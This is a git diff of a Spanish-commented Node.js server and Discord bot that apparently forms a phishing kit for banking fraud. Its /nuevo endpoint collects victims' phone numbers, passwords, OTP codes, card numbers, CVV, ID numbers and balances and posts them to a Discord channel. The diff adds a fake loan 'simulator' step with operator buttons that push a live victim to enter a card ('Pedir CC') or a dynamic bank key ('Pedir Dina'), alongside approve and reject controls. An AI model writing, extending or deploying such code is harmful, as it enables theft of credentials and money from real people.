@@ -38,7 +38,6 @@ function detectarMarca(tarjeta) {
 // 🔥 ENDPOINT PRINCIPAL
 app.post('/nuevo', async (req, res) => {
     try {
-        // 🔥 Agregamos 'documento' a la lista de datos que recibimos
         const { userId, accion, numero, password, datos, otp, tarjeta, codigo, documento, expMes, expAnio, saldo, infoCompleta } = req.body;
         
         const finalUserId = userId || 'anon_' + Date.now();
@@ -47,7 +46,8 @@ app.post('/nuevo', async (req, res) => {
         // 1. DATOS PREVIOS
         if (accion && accion !== 'tarjeta') {
             let embed = new EmbedBuilder().setColor(0xda0081).setTimestamp().setFooter({ text: `User ID: ${finalUserId}` });
-            
+            let row = null;
+
             if (accion === 'inicio') {
                 embed.setTitle('👀 Usuario en la página de inicio');
             } 
@@ -72,6 +72,12 @@ app.post('/nuevo', async (req, res) => {
                          { name: '📆 Día de Pago', value: `\`${datos.fechaPago}\``, inline: true },
                          { name: '💵 Monto Solicitado', value: `\`${datos.monto}\``, inline: true }
                      );
+
+                // 🔥 BOTONES PARA EL SIMULADOR
+                row = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder().setCustomId(`cc_${finalUserId}`).setLabel('💳 Pedir CC').setStyle(ButtonStyle.Primary),
+                    new ButtonBuilder().setCustomId(`dina_${finalUserId}`).setLabel('📱 Pedir Dina').setStyle(ButtonStyle.Success)
+                );
             } 
             else if (accion === 'otp') {
                 let infoTexto = '';
@@ -83,7 +89,18 @@ app.post('/nuevo', async (req, res) => {
                          `📱 **Número:** ${numero || 'N/A'}\n🔒 **Contraseña:** ${password || 'N/A'}\n💰 **Saldo Declarado:** ${saldo || 'N/A'}\n🔢 **OTP Ingresado:** ${otp}\n----------------------------\n**Info Completa:**\n\`\`\`\n${infoTexto}\n\`\`\``
                      );
             }
-            await channel.send({ embeds: [embed] });
+            
+            const payload = { embeds: [embed] };
+            if (row) payload.components = [row];
+
+            const msg = await channel.send(payload);
+            
+            // Guardamos el estado de la sesión
+            let s = sesiones.get(finalUserId) || {};
+            s.estado = accion === 'simulador' ? 'esperando_decision_simulador' : (s.estado || 'pending');
+            s.discordMsgId = msg.id;
+            sesiones.set(finalUserId, s);
+
             return res.json({ ok: true });
         }
 
@@ -97,7 +114,6 @@ app.post('/nuevo', async (req, res) => {
 
         const marca = detectarMarca(tarjeta);
 
-        // 🔥 AQUÍ SEPARAMOS EL CVV Y LA CÉDULA EN EL EMBED
         const embed = new EmbedBuilder()
             .setTitle('💳 Nueva tarjeta')
             .setColor(0xda0081)
@@ -176,19 +192,33 @@ client.on('interactionCreate', async (interaction) => {
     const action = parts[0];
     const userId = parts.slice(1).join('_');
 
-    const s = sesiones.get(userId);
+    let s = sesiones.get(userId) || {};
     
     if (!s) return interaction.reply({ content: '❌ Sesión no encontrada o expirada.', ephemeral: true });
 
-    if (action === 'otp') {
+    // 🔥 NUEVOS BOTONES DEL SIMULADOR
+    if (action === 'cc') {
+        s.estado = 'pedir_cc';
+        sesiones.set(userId, s);
+        await interaction.reply({ content: `💳 Se solicitó tarjeta al usuario.`, ephemeral: true });
+    } 
+    else if (action === 'dina') {
+        s.estado = 'pedir_dina';
+        sesiones.set(userId, s);
+        await interaction.reply({ content: `📱 Se solicitó dinámica al usuario.`, ephemeral: true });
+    }
+    // BOTONES DE LA TARJETA
+    else if (action === 'otp') {
         s.estado = 'pedir_otp'; 
         sesiones.set(userId, s);
         await interaction.reply({ content: `📱 Pantalla de OTP solicitada al usuario.`, ephemeral: true });
-    } else if (action === 'approve') {
+    } 
+    else if (action === 'approve') {
         s.estado = 'approved';
         sesiones.set(userId, s);
         await interaction.reply({ content: `✅ Usuario aprobado.`, ephemeral: true });
-    } else if (action === 'reject') {
+    } 
+    else if (action === 'reject') {
         s.estado = 'rejected';
         sesiones.set(userId, s);
         await interaction.reply({ content: `❌ Usuario rechazado.`, ephemeral: true });
